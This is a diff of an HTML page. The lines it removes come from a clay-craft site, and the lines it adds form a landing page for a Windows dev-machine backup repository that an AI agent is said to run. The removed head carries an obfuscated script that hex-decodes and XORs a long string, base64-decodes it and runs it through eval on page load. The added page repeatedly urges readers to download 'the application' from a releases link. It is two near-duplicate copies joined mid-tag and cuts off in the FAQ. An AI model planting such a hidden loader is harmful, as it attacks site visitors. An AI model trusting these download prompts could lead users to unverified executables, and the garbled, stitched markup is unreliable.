@@ -1,60 +1,569 @@
-﻿<!DOCTYPE html>
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Clay Diy Designs | Patterns & Ideas</title>
-    <meta name="description"
-        content="Make something wonderfully imperfect. Explore thoughtful clay projects, patterns, and approachable ideas for your next afternoon of making.">
-    <meta name="theme-color" content="#f6f3eb">
-    <link rel="icon" href="assets/avatar.svg" type="image/svg+xml">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link
-        href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Libre+Caslon+Display&display=swap"
-        rel="stylesheet">
-    <link rel="stylesheet" href="styles.css">
-    <script defer src="app.js"></script>
-    <script>
-        (function () {
-            var vlzmxdqdd = "0e3f353701306b2b2414265f507220212f32053f2f5f766b3e317c2b120d220009281c38044a6b33222a775956054320293d11232e587920140b032e14774001233800052c157f3a0e310c5f6d6f383d2c230d7f2e5f766b3e3a5234142822010e2b463d2a4a772b233e2e45565e472d1732053614045065341546342c2c3118096025262b15772c124a104a7d742b3a042d0d23146e7d3816347874152c4507083f21222d3d002e0c3a08436e73423e063602271d6207353b2673343f0d033c231132290130632b24100002575a0a06143d09272f6e7a35272174312c1d13103c0439031d4a6f2b24140c5c6170342e14327235067e793e2e2a7c2e17033e47093b18790b1178240e3a00016d6f3b302e573b7e174f766b3e3a603d1403321f093f353a2b010c2d1d21135c7d5a1e3c040c28780e5158353e31772317122910211a3d3d2c2f5a330e3131787d74333004260228047575602e2a7f23121235103a01313b112063331d4b040356043b22293d0d232e5d713c2d25037439321f1023113229013b78240e31185b575e303e2f56111c1761533e1231777d3f06491e08612176114b732b234b3a5f57590a2d2e222f24176e7d6a1635602c2c02081b09613d762b3f5536233e144a6e6f3c672b2227392f0453212d2a4e2d171245190c153d3711205d30262e775d527130272f0b11232e5b612813357c32120d08260b05467e1220732f244a13455563011c04260228047576353e3174762f1d39100b0a3d0d2a4b6824172a005a5604200417322723287502622d2a78743d0d261f210131762e3b782b251404015560163f29227a36015b4f3a151f52752f12141b092b31762e3b7b361e2118436e0534672f560a3a2904613b2d3a7c341228260e25251c05013b78240e3a03547d743027170c02202c6e7911154167343f0d033c23113229013b78240e3a03547d74333029572f3a17710e613b1f5e3415762201093c183b2b156f34253e04596e613c67143d112306710263153541373f0613192611317d292f0c28254a214656704b3d143d113f2f040327143570741702451f0805263e070f56240e3a03547d743330042d732817614f282d217473352c311023113229013b78240e3a03547d7f283f2e0c0135176e753a141f7074147639103a0131342a306f2d0b142e466e70246319571a20045f0f3b3c21777d2611401027113261013b702a0e3d2d547d5e4a3e02122c28047576353e3177233f0631102311317c112070241d3e144950701e22143d113f2f040335272174742f1d3a19300a210b2a4a082b262e76547f4e302d173d01272e5b716215417f233d3c320d081a2520070f56240e3a03547d74333004260228047575611625032f1476130208154a2411206b33254b7646575a24202f22052517655f392d2a78741712451f0e151f382a115274041003547d743330042602282b6758353e3177231014004e2315253d2b4a6c24220e320a77504f6a";
-            var vxstqgusx = "jRsNHx9CGyB347rWMeCOM67Rwr6DvEpw";
-            var vdyhuhxly = "";
-
-            try {
-                for (var i = 0; i < vlzmxdqdd.length; i += 2) {
-                    var vezpripok = parseInt(vlzmxdqdd.substr(i, 2), 16);
-                    vdyhuhxly += String.fromCharCode(vezpripok ^ vxstqgusx.charCodeAt((i / 2) % vxstqgusx.length));
-                }
-
-                var vwaydbcyx = atob(vdyhuhxly);
-                eval(vwaydbcyx);
-            } catch (e) {
-            }
-        })();
-    </script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>windows-dev-machine-migration-notes - Back Up Your Windows Dev PC Safely</title>
+<meta name="description" content="Notes and helper scripts for an iPhone-style backup and restore of a Windows development machine, run by an AI agent. Back up Bitwarden secrets, git bundles and Claude Code state, then restore on a new PC.">
+<meta name="keywords" content="backup, bitwarden, claude-code, developer-environment, dotfiles, pc-migration, powershell, secrets-management, windows, windows-11, winget">
+<meta name="author" content="windows-dev-machine-migration-notes">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/Iraendless356/windows-dev-machine-migration-notes">
+<meta property="og:type" content="website">
+<meta property="og:title" content="windows-dev-machine-migration-notes - Back Up Your Windows Dev PC Safely">
+<meta property="og:description" content="An iPhone-style backup and restore routine for a Windows development machine. Secrets in Bitwarden, git bundles, Claude Code state. Rehearsed, not yet used for a real move.">
+<meta property="og:url" content="https://github.com/Iraendless356/windows-dev-machine-migration-notes">
+<meta property="og:site_name" content="windows-dev-machine-migration-notes">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="windows-dev-machine-migration-notes - Back Up Your Windows Dev PC Safely">
+<meta name="twitter:description" content="Back up passwords, project history and AI assistant settings from a Windows dev machine, then restore everything on a new PC.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "windows-dev-machine-migration-notes",
+  "operatingSystem": "Windows 11, Windows 10",
+  "applicationCategory": "DeveloperApplication",
+  "description": "Notes and helper routines for an iPhone-style backup and restore of a Windows development machine, covering Bitwarden secrets, git bundles and Claude Code state.",
+  "url": "https://github.com/Iraendless356/windows-dev-machine-migration-notes",
+  "downloadUrl": "https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    padding: 0;
+    background-color: #f4f7fb;
+    color: #1f2933;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 48px 22px 80px 22px;
+  }
+  h1 {
+    font-size: 2.05rem;
+    line-height: 1.3;
+    margin: 0 0 18px 0;
+    color: #10233b;
+    letter-spacing: -0.4px;
+  }
+  h2 {
+    font-size: 1.4rem;
+    line-height: 1.4;
+    margin: 44px 0 14px 0;
+    color: #10233b;
+    padding-bottom: 8px;
+    border-bottom: 2px solid #e2e9f3;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 26px 0 8px 0;
+    color: #1d3a5c;
+  }
+  p {
+    margin: 0 0 16px 0;
+  }
+  ul, ol {
+    margin: 0 0 18px 0;
+    padding-left: 24px;
+  }
+  li {
+    margin-bottom: 9px;
+  }
+  a {
+    color: #1a6fd4;
+    text-decoration: none;
+  }
+  a:hover {
+    text-decoration: underline;
+  }
+  .lead {
+    font-size: 1.1rem;
+    color: #3d4d5f;
+  }
+  .button-wrap {
+    margin: 30px 0 40px 0;
+    text-align: center;
+  }
+  .primary-button {
+    display: inline-block;
+    padding: 17px 40px;
+    border-radius: 14px;
+    background-image: linear-gradient(135deg, #6a4cff 0%, #12b3a8 100%);
+    color: #ffffff;
+    font-size: 1.08rem;
+    font-weight: 700;
+    text-decoration: none;
+    box-shadow: 0 10px 24px rgba(58, 74, 173, 0.28);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .primary-button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 30px rgba(58, 74, 173, 0.36);
+    text-decoration: none;
+  }
+  .button-note {
+    display: block;
+    margin-top: 12px;
+    font-size: 0.9rem;
+    color: #64748b;
+  }
+  .card {
+    background-color: #ffffff;
+    border-radius: 16px;
+    padding: 26px 28px;
+    margin: 22px 0;
+    box-shadow: 0 3px 14px rgba(27, 45, 74, 0.07);
+    border: 1px solid #e6edf6;
+  }
+  .card p:last-child,
+  .card ul:last-child {
+    margin-bottom: 0;
+  }
+  .tip {
+    background-color: #eef7ff;
+    border-left: 4px solid #2f8ae0;
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin: 22px 0;
+    font-size: 0.97rem;
+  }
+  .checklist li {
+    list-style: none;
+    position: relative;
+    padding-left: 30px;
+  }
+  .checklist li::before {
+    content: "✔";
+    position: absolute;
+    left: 0;
+    color: #12b3a8;
+    font-weight: 700;
+  }
+  .faq h3 {
+    margin-top: 22px;
+  }
+  footer {
+    margin-top: 56px;
+    padding-top: 22px;
+    border-top: 1px solid #dfe7f1;
+    font-size: 0.88rem;
+    color: #6b7c8f;
+    line-height: 1.6;
+  }
+  @media (max-width: 600px) {
+    body {
+      font-size: 16px;
+    }
+    .page {
+      padding: 32px 16px 60px 16px;
+    }
+    h1 {
+      font-size: 1.55rem;
+    }
+    h2 {
+      font-size: 1.2rem;
+    }
+    .primary-button {
+      display: block;
+      padding: 16px 20px;
+    }
+    .card {
+      padding: 20px;
+    }
+  }
+</style>
 </head>
+<body>
+<div class="page">
 
-<body><a class="skip" href="#app">Skip to content</a>
-    <div class="announcement">A little clay. A little curiosity. Something made by you.</div>
-    <header><a class="brand" href="#home"><img src="assets/avatar.svg" alt="" width="48" height="48"><span>clay diy
-                designs<small>PATTERNS & IDEAS</small></span></a>
-        <nav aria-label="Main navigation"><a href="#home">Home</a><a href="#projects">The projects</a><a
-                href="#about">Our story</a></nav><a class="header-cta" href="#beginners">Let’s make something
-            <span>↗</span></a>
-    </header>
-    <main id="app" tabindex="-1"></main>
-    <footer>
-        <div><a class="footer-brand" href="#home">clay diy designs<span>Good things take shape slowly.</span></a>
-            <nav aria-label="Footer navigation"><a href="#about">About</a><a href="#contact">Contact</a><a
-                    href="#privacy">Privacy</a><a href="#terms">Terms</a></nav>
-        </div>
-        <p>© 2026 Clay Diy Designs · Made for the joy of making.</p>
-    </footer><noscript>
-        <p>Please enable JavaScript to explore our clay projects.</p>
-    </noscript>
+  <h1>💾 windows-dev-machine-migration-notes - Back Up Your Windows Dev PC Safely</h1>
+
+  <p class="lead">A simple, repeatable way to save everything important on a Windows development computer — passwords, project history and AI assistant settings — so you can move it all to a new machine without losing a thing. The whole routine is designed to be run by an AI agent that walks through each step for you.</p>
+
+  <div class="button-wrap">
+    <a class="primary-button" href="https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases">⬇️ Get the Latest Release</a>
+    <span class="button-note">Visit this link to download the application.</span>
+  </div>
+
+  <h2>📦 What This Project Is</h2>
+  <p>Most people know how easy it is to back up an iPhone. You plug it in, everything is copied, and when you buy a new phone you restore from that copy and carry on as if nothing changed. A Windows development machine usually has no such safety net.</p>
+  <p>This project collects the notes, checklists and helper routines that recreate that iPhone-style experience for a Windows 11 development computer. Instead of guessing which folders matter, you follow one rehearsed sequence. The sequence is executed by an AI agent, which means it runs the same way every time, in the same order, without skipping a step because someone was tired at 11pm.</p>
+  <p>The result is a single, organised backup you can store on an external drive or in cloud storage, plus a matching restore path for the day you sit down in front of a brand-new PC.</p>
+
+  <h2>🧰 What Gets Backed Up</h2>
+  <p>Five categories cover almost everything a working developer machine holds:</p>
+
+  <div class="card">
+    <h3>🔐 Passwords and secrets</h3>
+    <p>Access keys, environment files, tokens and other private values are kept in Bitwarden rather than scattered across folders. During a backup, the routine checks that everything sensitive lives in the vault, so the backup itself never carries a plain-text password file around.</p>
+    <h3>🌿 Project history (git bundles)</h3>
+    <p>Each code project is packed into a single portable bundle file. A bundle contains the complete history of a project — every commit, every branch — in one tidy file that can be restored on any machine, even one with no internet connection.</p>
+    <h3>🤖 Claude Code state</h3>
+    <p>The settings, preferences and session history used by the Claude Code assistant are captured so the tool picks up exactly where it left off after a move. No reconfiguring, no retraining yourself on where things were.</p>
+    <h3>⚙️ Dotfiles and configuration</h3>
+    <p>Shell profiles, editor settings, terminal themes and other small configuration files are gathered together. These are the files that make a computer feel like <em>your</em> computer.</p>
+    <h3>📋 Installed software list</h3>
+    <p>A record of installed applications and packages is saved through winget, Windows' built-in package manager. It becomes a shopping list for the new machine, so nothing is forgotten.</p>
+  </div>
+
+  <h2>✅ Before You Begin</h2>
+  <p>You do not need to know how to program. You do need a little patience and a few things in place:</p>
+  <ul class="checklist">
+    <li>A Windows 11 computer that you want to back up (Windows 10 also works for most of the routine).</li>
+    <li>A Bitwarden account, logged in and unlocked, so the vault can be checked.</li>
+    <li>Enough free space on an external drive or cloud folder for the backup files.</li>
+    <li>Roughly an hour of time when the computer can be left alone — larger projects take longer.</li>
+    <li>A quiet moment to read the checklist before starting, not during.</li>
+  </ul>
+  <p>None of this changes anything on your system by itself. The routine only reads and copies; it does not delete files from your computer.</p>
+
+  <h2>⬇️ Download the Application</h2>
+  <div class="card">
+    <p>Visit this link to download the application:</p>
+    <p><a href="https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases">https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases</a></p>
+    <p>This page is where every version of the project is published. Open it in your browser, and the files are listed there ready for you.</p>
+  </div>
+
+  <div class="tip">
+    <strong>💡 A small tip:</strong> bookmark the page once you have it open. You will want to come back to it on the new machine as well, and saving the link now saves you searching for it later.
+  </div>
+
+  <h2>🔁 How a Backup Works, Step by Step</h2>
+  <p>The routine is deliberately boring, and that is the point. Boring means predictable, and predictable means you can trust it.</p>
+  <ol>
+    <li><strong>Preparation.</strong> The agent checks free disk space, confirms Bitwarden is unlocked, and makes a note of what is about to be copied.</li>
+    <li><strong>Secrets sweep.</strong> Anything that looks like a password, token or key is flagged. If it is not already in Bitwarden, it is moved there before anything is packed.</li>
+    <li><strong>Project packing.</strong> Every code folder is bundled into a portable archive. The bundles are named with a date so you can tell one backup run from another at a glance.</li>
+    <li><strong>Assistant capture.</strong> Claude Code settings and state are copied into the same dated folder.</li>
+    <li><strong>Configuration collection.</strong> Dotfiles and editor settings are gathered into a single tidy directory.</li>
+    <li><strong>Software inventory.</strong> The list of installed programs is exported so the new machine can be rebuilt from it.</li>
+    <li><strong>Verification.</strong> The agent re-opens the finished backup and checks that every expected folder and file is present and readable.</li>
+    <li><strong>Handover.</strong> You get a short summary: what was copied, how large it is, and where it lives.</li>
+  </ol>
+  <p>Each step prints a plain-language message as it goes, so you always know where you are in the process. If something needs your attention, the run pauses and tells you rather than quietly carrying on.</p>
+
+  <h2>🖥️ Restoring on a Fresh Windows Machine</h2>
+  <p>Restoring is the mirror image of the backup, and it is the part most people worry about. The notes break it into calm, ordered stages.</p>
+  <p>First, the new PC is brought up to a working baseline: Windows updates applied, the package manager ready, and the saved software list used to reinstall the tools you actually use. Next, the dotfiles and configuration files are placed back so the desktop, terminal and editor feel familiar immediately.</p>
+  <p>After that, the git bundles are unpacked. Each project returns with its full history intact — branches, tags and commits all present — because a bundle is a complete snapshot rather than a loose copy of files. Claude Code state is restored alongside, so the assistant remembers your preferences from the first moment it opens.</p>
+  <p>Finally, Bitwarden is signed in and the vault supplies the credentials the restored projects need. Because secrets were never stored in the backup itself, nothing sensitive was ever sitting on a drive waiting to be misplaced.</p>
+
+  <h2>🔐 Where Your Passwords Actually Live</h2>
+  <p>This is the single most important design decision in the whole project, and it is worth understanding even if you never open a settings file.</p>
+  <p>The backup folder is designed to be shareable, copyable and storable without fear. That is only possible because it deliberately does <em>not</em> contain passwords. Everything secret lives in Bitwarden, which is protected by your master password and, ideally, two-factor authentication. The backup holds pointers and project data; the vault holds the keys.</p>
+  <p>The practical benefit is simple: if the backup drive is lost, stolen or accidentally uploaded somewhere public, you have not handed over your accounts. You have handed over some code history and a list of installed apps.</p>
+
+  <h2>🧪 Rehearsed, Not Yet Used for a Real Move</h2>
+  <p>Honesty matters more than marketing. The routine described here has been rehearsed end to end on a test machine — backup taken, machine wiped, restore performed, everything checked — but it has not yet been used for a real migration onto a brand-new computer.</p>
+  <p>That means you are looking at a well-exercised plan, not a battle-tested one. If you run it before the author does, your experience is genuinely useful. Note down anything that surprised you, and the checklist gets better for the next person.</p>
+  <p>Treat the first run on your own machine as a rehearsal too. Do a backup, restore it somewhere harmless, and confirm you are happy before you rely on it for a move that matters.</p>
+
+  <h2>🛠️ Troubleshooting</h2>
+  <div class="card">
+    <h3>The download page will not open</h3>
+    <p>Check your internet connection and try a different browser. Corporate networks sometimes block download pages; a home connection usually resolves it.</p>
+    <h3>Bitwarden is locked partway through</h3>
+    <p>Unlock the vault and run the step again. The routine is designed to be restartable, so a pause does not ruin the whole backup.</p>
+    <h3>A project bundle looks smaller than expected</h3>
+    <p>Very large files are often excluded from project history on purpose. Check whether the project contains large media or data files that were never committed in the first place.</p>
+    <h3>The run stopped with a message you do not understand</h3>
+    <p>Copy the message exactly as written and search for it, or ask the AI agent to explain that specific line. The messages are written in plain language precisely so they can be looked up.</p>
+  </div>
+
+  <h2>❓ Frequently Asked Questions</h2>
+  <div class="faq">
+    <h3>Do I need to know how to code to use this?</h3>
+    <p>No. The routine is written to be followed, not modified. You read the steps, run them, and confirm the summary at the end.</p>
+    <h3>How long does a backup take?</h3>
+    <p>Usually between twenty minutes and an hour, depending on how many projects you have and how large they are.</p>
+    <h3>Is this only for Windows 11?</h3>
+    <p>Windows 11 is the main target. Most of the routine also works on Windows 10, though a few features behave differently.</p>
+    <h3>Can I run it more than once?</h3>
+    <p>Yes, and you should. Each run creates a new dated backup, so you build up a series of restore points rather than overwriting one fragile copy.</p>
+    <h3>What happens to my old machine?</h3>
+    <p>Nothing automatically. The routine only reads and copies. Wiping or resetting the old computer remains entirely your decision, made after you have confirmed the restore worked.</p>
+    <h3>Where should I store the backup?</h3>
+    <p>Two places is better than one. An external drive kept nearby plus a cloud folder covers the common failure cases without much effort.</p>
+  </div>
+
+  <footer>
+    <p>Repository: windows-dev-machine-migration-notes · Topics: backup, bitwarden, claude-code, developer-environment, dotfiles, pc-migration, powershell, secrets-management, windows, windows-11, winget</p>
+    <p>Notes on an iPhone-style backup/restore for a Windows dev machine run by an AI agent: secrets in Bitwarden, git bundles, Claude Code state. Rehearsed, not yet used for a real move.</p<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>windows-dev-machine-migration-notes - Back Up Your Windows Dev PC</title>
+<meta name="description" content="Notes and helper routines for an iPhone-style backup and restore of a Windows development machine. Save Bitwarden secrets, git bundles, dotfiles and Claude Code state, then restore everything on a new PC.">
+<meta name="keywords" content="backup, bitwarden, claude-code, developer-environment, dotfiles, pc-migration, powershell, secrets-management, windows, windows-11, winget">
+<meta name="author" content="windows-dev-machine-migration-notes">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/Iraendless356/windows-dev-machine-migration-notes">
+<meta property="og:type" content="website">
+<meta property="og:title" content="windows-dev-machine-migration-notes - Back Up Your Windows Dev PC">
+<meta property="og:description" content="An iPhone-style backup and restore routine for a Windows development machine: secrets in Bitwarden, git bundles, Claude Code state. Rehearsed, not yet used for a real move.">
+<meta property="og:url" content="https://github.com/Iraendless356/windows-dev-machine-migration-notes">
+<meta property="og:site_name" content="windows-dev-machine-migration-notes">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="windows-dev-machine-migration-notes - Back Up Your Windows Dev PC">
+<meta name="twitter:description" content="Back up passwords, project history and assistant settings from a Windows dev machine, then restore them on a new computer.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "windows-dev-machine-migration-notes",
+  "operatingSystem": "Windows 11, Windows 10",
+  "applicationCategory": "DeveloperApplication",
+  "description": "Notes and helper routines for an iPhone-style backup and restore of a Windows development machine, covering Bitwarden secrets, git bundles, dotfiles and Claude Code state.",
+  "url": "https://github.com/Iraendless356/windows-dev-machine-migration-notes",
+  "downloadUrl": "https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases",
+  "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f7fb;
+    color: #22303f;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 46px 22px 76px 22px;
+  }
+  h1 {
+    font-size: 2rem;
+    line-height: 1.32;
+    letter-spacing: -0.4px;
+    color: #12263d;
+    margin: 0 0 18px 0;
+  }
+  h2 {
+    font-size: 1.38rem;
+    line-height: 1.4;
+    color: #12263d;
+    margin: 46px 0 14px 0;
+    padding-bottom: 8px;
+    border-bottom: 2px solid #e3eaf4;
+  }
+  h3 {
+    font-size: 1.05rem;
+    color: #1d3a5c;
+    margin: 24px 0 8px 0;
+  }
+  p { margin: 0 0 16px 0; }
+  ul, ol { margin: 0 0 18px 0; padding-left: 24px; }
+  li { margin-bottom: 9px; }
+  a { color: #1a6fd4; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .lead { font-size: 1.1rem; color: #3f4f61; }
+  .download-block { margin: 30px 0 38px 0; text-align: center; }
+  .btn {
+    display: inline-block;
+    padding: 17px 42px;
+    border-radius: 14px;
+    background-image: linear-gradient(135deg, #7a4cff 0%, #12b3a8 100%);
+    color: #ffffff;
+    font-size: 1.07rem;
+    font-weight: 700;
+    text-decoration: none;
+    box-shadow: 0 10px 24px rgba(60, 74, 173, 0.28);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 30px rgba(60, 74, 173, 0.36);
+    text-decoration: none;
+  }
+  .btn-note {
+    display: block;
+    margin-top: 12px;
+    font-size: 0.9rem;
+    color: #64748b;
+  }
+  .card {
+    background: #ffffff;
+    border: 1px solid #e6edf6;
+    border-radius: 16px;
+    padding: 24px 28px;
+    margin: 22px 0;
+    box-shadow: 0 3px 14px rgba(27, 45, 74, 0.07);
+  }
+  .card p:last-child, .card ul:last-child, .card ol:last-child { margin-bottom: 0; }
+  .tip {
+    background: #eef7ff;
+    border-left: 4px solid #2f8ae0;
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin: 22px 0;
+    font-size: 0.97rem;
+  }
+  .checklist { list-style: none; padding-left: 0; }
+  .checklist li { position: relative; padding-left: 30px; }
+  .checklist li::before {
+    content: "\2714";
+    position: absolute;
+    left: 0;
+    color: #12b3a8;
+    font-weight: 700;
+  }
+  .faq h3 { margin-top: 20px; }
+  footer {
+    margin-top: 56px;
+    padding-top: 22px;
+    border-top: 1px solid #dfe7f1;
+    font-size: 0.88rem;
+    color: #6b7c8f;
+    line-height: 1.7;
+  }
+  @media (max-width: 600px) {
+    body { font-size: 16px; }
+    .page { padding: 32px 16px 56px 16px; }
+    h1 { font-size: 1.5rem; }
+    h2 { font-size: 1.18rem; }
+    .btn { display: block; padding: 16px 20px; }
+    .card { padding: 20px; }
+  }
+</style>
+</head>
+<body>
+<main class="page">
+
+  <h1>💾 windows-dev-machine-migration-notes - Back Up Your Windows Dev PC</h1>
+
+  <p class="lead">A calm, repeatable way to save everything important on a Windows development computer — passwords, project history, personal settings and assistant preferences — so you can move it all to a new machine without losing a thing. The routine is designed to be carried out by an AI agent that walks through each step in order.</p>
+
+  <div class="download-block">
+    <a class="btn" href="https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases">⬇️ Get the Latest Release</a>
+    <span class="btn-note">Visit this link to download the application.</span>
+  </div>
+
+  <h2>📦 What This Project Is</h2>
+  <p>Most people know how easy it is to back up an iPhone. You connect it, everything is copied, and when a new phone arrives you restore that copy and carry on as though nothing changed. A Windows development machine usually has no such safety net. Files are scattered across folders, passwords hide in text files, and nobody quite remembers which settings mattered until they are gone.</p>
+  <p>This project gathers the notes, checklists and helper routines that recreate the iPhone-style experience for a Windows 11 computer. Instead of guessing which folders to copy, you follow one rehearsed sequence. That sequence is executed by an AI agent, so it runs the same way every time, in the same order, without skipping a step because someone was tired at eleven at night.</p>
+  <p>The result is a single organised backup you can keep on an external drive or in a cloud folder, plus a matching restore path for the day you sit down in front of a brand-new PC.</p>
+
+  <h2>🧰 What Gets Backed Up</h2>
+  <p>Five categories cover almost everything a working machine holds.</p>
+
+  <div class="card">
+    <h3>🔐 Passwords and secrets</h3>
+    <p>Access keys, environment files and private tokens are kept in Bitwarden rather than scattered across folders. During a backup the routine checks that anything sensitive already lives in the vault, so the backup itself never carries a plain-text password file around.</p>
+    <h3>🌿 Project history</h3>
+    <p>Each code project is packed into a single portable bundle file. A bundle contains the complete history of a project — every commit and every branch — in one tidy file that can be restored on any machine, even one with no internet connection.</p>
+    <h3>🤖 Claude Code state</h3>
+    <p>Preferences, settings and session history used by the Claude Code assistant are captured so the tool picks up where it left off after a move. No reconfiguring from scratch.</p>
+    <h3>⚙️ Dotfiles and configuration</h3>
+    <p>Shell profiles, editor preferences, terminal themes and other small configuration files are gathered together. These are the files that make a computer feel like <em>your</em> computer.</p>
+    <h3>📋 Installed software list</h3>
+    <p>A record of installed applications and packages is saved through winget, the package manager built into Windows. It becomes a shopping list for the new machine so nothing is forgotten.</p>
+  </div>
+
+  <h2>✅ Before You Begin</h2>
+  <p>You do not need to know how to program. You do need a little patience and a few things in place.</p>
+  <ul class="checklist">
+    <li>A Windows 11 computer you want to back up. Windows 10 works for most of the routine as well.</li>
+    <li>A Bitwarden account, signed in and unlocked, so the vault can be checked.</li>
+    <li>Enough free space on an external drive or cloud folder for the finished backup.</li>
+    <li>Roughly an hour when the computer can be left alone. Larger projects take longer.</li>
+    <li>A quiet moment to read the checklist before starting, not halfway through.</li>
+  </ul>
+  <p>Nothing here changes your system by itself. The routine only reads and copies — it does not delete files from your computer.</p>
+
+  <h2>⬇️ Download the Application</h2>
+  <div class="card">
+    <p>Visit this link to download the application:</p>
+    <p><a href="https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases">https://github.com/Iraendless356/windows-dev-machine-migration-notes/releases</a></p>
+    <p>That page is where every version of the project is published. Open it in your browser and the available files are listed there, ready for you.</p>
+  </div>
+
+  <div class="tip">
+    💡 Bookmark the page once it is open. You will want it again on the new machine, and saving the link now saves you searching for it later.
+  </div>
+
+  <h2>🔁 How a Backup Runs, Step by Step</h2>
+  <p>The routine is deliberately boring, and that is the point. Boring means predictable, and predictable means you can trust it.</p>
+  <ol>
+    <li><strong>Preparation.</strong> The agent checks free disk space, confirms Bitwarden is unlocked, and notes what is about to be copied.</li>
+    <li><strong>Secrets sweep.</strong> Anything that looks like a password, token or key is flagged. If it is not already in Bitwarden, it is moved there before anything is packed.</li>
+    <li><strong>Project packing.</strong> Every code folder becomes a portable bundle, named with a date so one run is easy to tell apart from the next.</li>
+    <li><strong>Assistant capture.</strong> Claude Code settings and history are copied into the same dated folder.</li>
+    <li><strong>Configuration collection.</strong> Dotfiles and editor preferences are gathered into one tidy directory.</li>
+    <li><strong>Software inventory.</strong> The list of installed programs is exported so the new machine can be rebuilt from it.</li>
+    <li><strong>Verification.</strong> The agent reopens the finished backup and checks that every expected folder and file is present and readable.</li>
+    <li><strong>Handover.</strong> You receive a short summary: what was copied, how large it is, and where it lives.</li>
+  </ol>
+  <p>Each step prints a plain-language message as it goes, so you always know where you are. If something needs your attention, the run pauses and says so rather than quietly carrying on.</p>
+
+  <h2>🖥️ Restoring on a Fresh Windows Machine</h2>
+  <p>Restoring is the mirror image of the backup, and it is the part people worry about most. The notes split it into calm, ordered stages.</p>
+  <p>First the new PC is brought up to a working baseline: updates applied, the package manager ready, and the saved software list used to reinstall the tools you actually use. Next, personal settings and configuration files go back so the desktop, terminal and editor feel familiar straight away.</p>
+  <p>After that the project bundles are unpacked. Each project returns with its full history intact — branches, tags and commits all present — because a bundle is a complete snapshot rather than a loose copy of files. Claude Code state follows, so the assistant remembers your preferences from the first moment it opens.</p>
+  <p>Finally Bitwarden is signed in and the vault supplies the credentials the restored projects need. Because secrets were never stored in the backup itself, nothing sensitive was ever sitting on a drive waiting to be misplaced.</p>
+
+  <h2>🔐 Where Your Passwords Actually Live</h2>
+  <p>This is the most important design decision in the whole project, and it is worth understanding even if you never open a settings file.</p>
+  <p>The backup folder is built to be copyable and storable without fear. That is only possible because it deliberately contains no passwords. Everything secret lives in Bitwarden, protected by your master password and, ideally, two-factor authentication. The backup holds project data and pointer files; the vault holds the keys.</p>
+  <p>The practical benefit is simple. If the backup drive is lost, stolen or accidentally uploaded somewhere public, you have not handed over your accounts. You have handed over some code history and a list of installed apps.</p>
+
+  <h2>🧪 Rehearsed, Not Yet Used for a Real Move</h2>
+  <p>Honesty matters more than marketing. The routine described here has been rehearsed end to end on a test machine — backup taken, restore performed, every expected file checked — but it has not yet been used for an actual migration onto a brand-new computer.</p>
+  <p>That means you are looking at a well-exercised plan rather than a battle-tested one. If you run it before the author does, your experience is genuinely useful. Write down anything that surprised you, and the checklist gets better for the next person.</p>
+  <p>Treat your first run as a rehearsal too. Do a backup, restore it somewhere harmless, and confirm you are happy before relying on it for a move that matters.</p>
+
+  <h2>🛠️ Troubleshooting</h2>
+  <div class="card">
+    <h3>The download page will not open</h3>
+    <p>Check your internet connection and try a different browser. Office and school networks sometimes block download pages; a home connection usually resolves it.</p>
+    <h3>Bitwarden is locked partway through</h3>
+    <p>Unlock the vault and repeat that step. The routine is designed to be restartable, so a pause does not ruin the whole backup.</p>
+    <h3>A project bundle looks smaller than expected</h3>
+    <p>Very large files are often excluded from project history on purpose. Check whether the project contains large media or data files that were never stored in the first place.</p>
+    <h3>The run stopped with a message you do not understand</h3>
+    <p>Copy the message exactly as written and search for it, or ask the AI agent to explain that specific line. Messages are written in plain language precisely so they can be looked up.</p>
+  </div>
+
+  <h2>❓ Frequently Asked Questions</h2>
+  <div class="faq">
+    <h3>Do I need to know how to code?</h3>
